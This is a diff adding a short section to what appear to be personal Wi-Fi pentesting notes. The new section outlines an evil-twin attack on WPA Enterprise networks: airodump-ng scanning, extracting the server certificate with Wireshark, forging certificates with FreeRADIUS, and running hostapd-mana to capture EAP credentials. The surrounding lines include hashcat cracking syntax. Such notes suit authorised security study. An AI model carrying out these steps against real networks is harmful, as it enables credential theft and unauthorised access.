@@ -69,3 +69,15 @@ hashcat -m [hashtype] [hash] [dictionary]
 scp kali@192.168.10.94:/home/kali/1.cap-01.cap .
 gzip -d file .gz
 ```
+## Attacking WPA Enterprise
+```
+sudo airodump-ng wlan0mon
+WPA2 CCMP MGT = WPA Enterprise
+```
+### Capture handshake > Wireshark > tls.handshake.type==11 
+### Server certificate frame > EAP > TLS > Certificate
+### Create certs with FreeRadius
+### Hostapd-mana > mana.conf > mana.eap_user
+```
+sudo hostapd-mana /etc/hostapd-mana/mana.conf
+```
